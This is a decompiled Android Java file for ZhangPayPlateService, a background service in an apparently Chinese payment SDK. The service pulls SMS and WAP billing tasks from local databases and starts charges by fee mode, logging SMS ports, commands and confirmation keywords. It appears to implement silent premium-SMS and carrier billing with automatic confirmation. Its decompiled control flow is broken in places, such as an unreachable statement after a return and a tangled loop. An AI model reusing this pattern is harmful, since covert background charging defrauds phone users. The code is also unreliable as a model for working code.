package com.zhangzhifu.sdk.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import com.zhangzhifu.sdk.db.MMQWapDBManager;
import com.zhangzhifu.sdk.db.MMWapDBManager;
import com.zhangzhifu.sdk.db.OnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.PcOnlineGameWapDBManager;
import com.zhangzhifu.sdk.db.SMSDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.db.WoLianTWapDBManager;
import com.zhangzhifu.sdk.modle.SMSBean;
import com.zhangzhifu.sdk.modle.ZhangPayBean;
import com.zhangzhifu.sdk.onlinegame.ZhangPayMMF;
import com.zhangzhifu.sdk.onlinegame.ZhangPayMMQWF;
import com.zhangzhifu.sdk.onlinegame.ZhangPayOGWF;
import com.zhangzhifu.sdk.onlinegame.ZhangPayPCOWF;
import com.zhangzhifu.sdk.onlinegame.ZhangPayWOWF;
import com.zhangzhifu.sdk.util.MobileNetworkManage;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.sms.SMSFee;
import java.io.PrintStream;
import java.util.Iterator;
import java.util.List;

public class ZhangPayPlateService
  extends Service
{
  public static final String SENT_SMS_ACTION = "zhang.pay.sms.send";
  public static final String TAG = "PlateService";
  public static final String TAG2 = "zhangPay_log";
  private static boolean dh;
  private Context bZ;
  private ZhangPayPlateService.MyServiceReceiver cW;
  private ZhangPayPCOWF cX;
  private ZhangPayMMF cY;
  private ZhangPayWOWF cZ;
  private ZhangPayMMQWF da;
  private List db;
  private List dc;
  private List dd;
  private List de;
  private List df;
  private List dg;
  private Handler mHandler = null;
  
  public ZhangPayPlateService() {}
  
  private static void a(List paramList)
  {
    paramList = paramList.iterator();
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      SMSBean localSMSBean = (SMSBean)paramList.next();
      System.out.println("SMSTaskInfo id=" + localSMSBean.getId() + " feeTimes=" + localSMSBean.getChargeCount() + " trone=" + localSMSBean.getPort() + " command=" + localSMSBean.getCmd() + " confirmKeyword=" + localSMSBean.getSecondPort() + " confirmTrone=" + localSMSBean.getSecondType() + " confirmCommand=");
    }
  }
  
  private void t()
  {
    for (;;)
    {
      try
      {
        dh = false;
        this.db = SMSDBManager.getInstance().getAllSMSBean(this);
        this.dc = OnlineGameWapDBManager.getInstance().getAllWap(this);
        this.dd = PcOnlineGameWapDBManager.getInstance().getAllWap(this);
        this.de = MMWapDBManager.getInstance().getAllWap(this);
        this.df = WoLianTWapDBManager.getInstance().getAllWap(this);
        this.dg = MMQWapDBManager.getInstance().getAllWap(this);
        int i;
        Object localObject1;
        if ((this.dc != null) && (this.dc.size() > 0))
        {
          i = 0;
          if (i != 0)
          {
            ZhangPayLog.d("PlateService", "没有ANDROID网游和彩信计费，直接恢复网络");
            MobileNetworkManage.recoverNetWorkDir(this);
          }
          localObject1 = SharePreferUtil.getInstance().getFeeMode(this.bZ);
          System.out.println("支付类型为：" + (String)localObject1);
          if ((localObject1 != null) && (localObject1 != ""))
          {
            if (((((String)localObject1).equals("0")) || (((String)localObject1).equals("7"))) && (!ZhangPayBean.SMS_FEEING))
            {
              ZhangPayLog.d("PlateService", "处理短信计费");
              a(this.db);
              SMSFee localSMSFee = new SMSFee(this, this.db);
              if (this.db != null)
              {
                ZhangPayLog.d("PlateService", "短信计费生成");
                localSMSFee.startSmsFee();
              }
            }
            if (((((String)localObject1).equals("13")) || (((String)localObject1).equals("14"))) && (!ZhangPayBean.WAP_FEEING))
            {
              ZhangPayLog.d("PlateService", "处理ANDROID网游计费");
              new ZhangPayOGWF(this).startFee(this.dc);
            }
            if ((((String)localObject1).equals("15")) && (!ZhangPayBean.PCWAP_FEEING))
            {
              this.cX = new ZhangPayPCOWF(this);
              this.cX.startFee(this.dd);
            }
            if ((((String)localObject1).equals("16")) && (!ZhangPayBean.MM_FEEING))
            {
              this.cY = new ZhangPayMMF(this);
              this.cY.startFee(this.de);
            }
            if ((((String)localObject1).equals("17")) && (!ZhangPayBean.WOWAP_FEEING))
            {
              this.cZ = new ZhangPayWOWF(this);
              this.cZ.startFee(this.df);
            }
            if ((((String)localObject1).equals("18")) && (!ZhangPayBean.MMQ_FEEING))
            {
              this.da = new ZhangPayMMQWF(this);
              this.da.startFee(this.dg);
            }
          }
          return;
        }
        if ((this.db != null) && (this.db.size() > 0))
        {
          localObject1 = this.db.iterator();
          if (!((Iterator)localObject1).hasNext()) {
            i = 1;
          } else if (!((SMSBean)((Iterator)localObject1).next()).isSms()) {
            i = 0;
          }
        }
        else
        {
          if (this.dd != null)
          {
            i = this.dd.size();
            if (i > 0)
            {
              i = 0;
              continue;
            }
          }
          i = 1;
        }
      }
      finally {}
    }
  }
  
  protected void finalize()
  {
    if (this.cW != null) {
      unregisterReceiver(this.cW);
    }
    super.finalize();
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.bZ = this;
    this.mHandler = new b(this);
    IntentFilter localIntentFilter = new IntentFilter("zhang.pay.sms.send");
    this.cW = new ZhangPayPlateService.MyServiceReceiver(this);
    registerReceiver(this.cW, localIntentFilter);
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    ZhangPayLog.i("zhangPay_log", "fee service start！");
    if (dh) {}
    do
    {
      return;
      new a(this).execute(new String[] { "" });
    } while ((ZhangPayBean.IVR_FEEING) || (ZhangPayBean.SMS_FEEING) || (ZhangPayBean.WAP_FEEING) || (ZhangPayBean.MM_FEEING) || (ZhangPayBean.PCWAP_FEEING) || (ZhangPayBean.WOWAP_FEEING));
    boolean bool = ZhangPayBean.MMQ_FEEING;
  }
}
